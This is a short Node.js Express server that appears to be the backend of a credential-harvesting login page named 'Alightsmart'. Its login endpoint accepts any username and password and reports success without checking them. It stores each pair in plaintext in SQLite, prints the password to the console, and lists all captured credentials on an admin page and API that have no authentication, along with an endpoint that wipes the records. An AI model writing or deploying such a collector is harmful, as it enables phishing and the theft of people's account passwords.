const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const db = new sqlite3.Database('./login_records.db');

// Create table if not exists
db.run(`CREATE TABLE IF NOT EXISTS records (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT,
    timestamp TEXT
)`);

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Save Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });

    db.run("INSERT INTO records (username, password, timestamp) VALUES (?, ?, ?)", 
        [username, password, timestamp], 
        (err) => {
            if (err) console.error(err);
            else console.log('✅ Login Saved:', { username, password });
        });

    res.json({ success: true });
});

// Get all records for Admin
app.get('/api/records', (req, res) => {
    db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
        if (err) return res.status(500).json([]);
        res.json(rows);
    });
});

// Admin Page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Clear all records
app.post('/api/clear', (req, res) => {
    db.run("DELETE FROM records", [], (err) => {
        if (err) console.error(err);
        res.json({ message: 'All records cleared' });
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Alightsmart running with permanent storage on port ${PORT}`);
});